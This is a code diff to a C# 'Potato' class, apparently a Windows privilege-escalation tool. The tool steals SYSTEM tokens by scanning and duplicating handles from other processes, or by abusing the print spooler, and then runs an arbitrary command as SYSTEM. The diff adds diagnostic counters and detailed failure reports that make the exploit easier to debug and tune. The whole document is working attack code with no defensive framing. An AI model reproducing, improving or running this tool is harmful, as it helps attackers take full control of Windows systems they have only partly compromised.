@@ -120,6 +120,8 @@ public class Potato
         return tt;
     }
 
+    static string _lastDiag = "";
+
     static IntPtr FindSystemTokenViaHandles()
     {
         const uint STATUS_INFO_LENGTH_MISMATCH = 0xC0000004;
@@ -144,6 +146,7 @@ public class Potato
 
         int myPid = Process.GetCurrentProcess().Id;
         IntPtr myProc = GetCurrentProcess();
+        int selfHandles = 0, selfSysToks = 0;
 
         // Phase 1: scan handles in own process
         for (long i = 0; i < count; i++)
@@ -157,9 +160,11 @@ public class Potato
             { pid = Marshal.ReadInt32(entry, 4); handle = Marshal.ReadIntPtr(entry, 8); }
 
             if (pid != myPid) continue;
+            selfHandles++;
 
             string sid = GetTokenSid(handle);
             if (sid != "S-1-5-18") continue;
+            selfSysToks++;
 
             int tokType = GetTokenType(handle);
             int impLevel = (tokType == 2) ? GetTokenImpLevel(handle) : -1;
@@ -175,6 +180,7 @@ public class Potato
         // Phase 2: duplicate from other processes
         int lastPid = -1;
         IntPtr lastProcHandle = IntPtr.Zero;
+        int opened = 0, duped = 0, sysToks = 0;
 
         for (long i = 0; i < count; i++)
         {
@@ -193,15 +199,18 @@ public class Potato
                 if (lastProcHandle != IntPtr.Zero) CloseHandle(lastProcHandle);
                 lastProcHandle = OpenProcess(0x0440, false, (int)pid);
                 lastPid = (int)pid;
+                if (lastProcHandle != IntPtr.Zero) opened++;
             }
             if (lastProcHandle == IntPtr.Zero) continue;
 
             IntPtr dupHandle;
             if (NtDuplicateObject(lastProcHandle, handle, myProc, out dupHandle, 0, 0, 2) != 0) continue;
+            duped++;
 
             string sid = GetTokenSid(dupHandle);
             if (sid == "S-1-5-18")
             {
+                sysToks++;
                 int tokType = GetTokenType(dupHandle);
                 int impLevel = (tokType == 2) ? GetTokenImpLevel(dupHandle) : -1;
 
@@ -222,6 +231,8 @@ public class Potato
 
         if (lastProcHandle != IntPtr.Zero) CloseHandle(lastProcHandle);
         Marshal.FreeHGlobal(buf);
+        _lastDiag = "handles=" + count + ",self=" + selfHandles + ",selfSys=" + selfSysToks
+            + ",procsOpened=" + opened + ",duped=" + duped + ",sysToks=" + sysToks;
         return IntPtr.Zero;
     }
 
@@ -337,17 +348,29 @@ public class Potato
         {
             _got = false; _sysToken = IntPtr.Zero;
             string used = "";
+            string diag = "";
+
+            bool spoolerRunning = SpoolerUp();
 
             if (tech == "auto" || tech == "spooler")
             {
-                if (SpoolerUp())
-                { if (RunSpoofer(15000)) used = "spooler"; }
+                if (spoolerRunning)
+                {
+                    if (RunSpoofer(15000)) used = "spooler";
+                    else diag += "spooler:pipe_ok_but_no_token;";
+                }
+                else diag += "spooler:service_not_running;";
             }
             if (!_got && (tech == "auto" || tech == "direct"))
             {
                 if (RunDirect()) used = "direct";
+                else diag += "direct:no_accessible_system_token;";
             }
-            if (!_got) return "FAIL:NO_SYSTEM_TOKEN";
+            if (!_got)
+            {
+                string id = WindowsIdentity.GetCurrent().Name;
+                return "FAIL:NO_SYSTEM_TOKEN|svc=" + id + "|spooler=" + (spoolerRunning ? "up" : "down") + "|" + diag + _lastDiag;
+            }
 
             string result = Exec(cmd);
             if (_sysToken != IntPtr.Zero) { CloseHandle(_sysToken); _sysToken = IntPtr.Zero; }
